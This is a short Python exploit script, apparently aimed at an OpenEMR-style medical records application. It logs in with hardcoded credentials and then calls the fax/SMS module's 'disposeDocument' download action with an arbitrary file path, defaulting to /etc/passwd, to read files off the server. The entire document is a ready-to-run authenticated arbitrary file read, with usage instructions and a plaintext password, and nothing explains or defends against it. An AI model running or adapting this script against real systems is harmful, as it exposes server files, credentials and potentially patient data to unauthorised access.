import sys
import requests

target = "http://localhost:8080"
site = "default"

# Usage: python3 mytest.py <username> <password> <file_path>
# Defaults to NIU / /etc/passwd if you don't pass arguments.
user = sys.argv[1] if len(sys.argv) > 1 else "NIU"
password = sys.argv[2] if len(sys.argv) > 2 else "Niu123@rezwan"
file_path = sys.argv[3] if len(sys.argv) > 3 else "/etc/passwd"

s = requests.Session()

# Step 1: log in
s.get(f"{target}/interface/login/login.php", params={"site": site})
s.post(f"{target}/interface/main/main_screen.php",
       params={"auth": "login", "site": site},
       data={
           "new_login_session_management": "1",
           "authProvider": "Default",
           "authUser": user,
           "clearPass": password,
           "languageChoice": "1",
       })

# Step 2: call the real, correct action directly - no guessing needed
r = s.get(f"{target}/interface/modules/custom_modules/oe-module-faxsms/index.php",
          params={
              "site": site,
              "type": "fax",
              "_ACTION_COMMAND": "disposeDocument",
              "file_path": file_path,
              "action": "download",
          })

print(f"[{user} -> {file_path}]")
print(r.text)
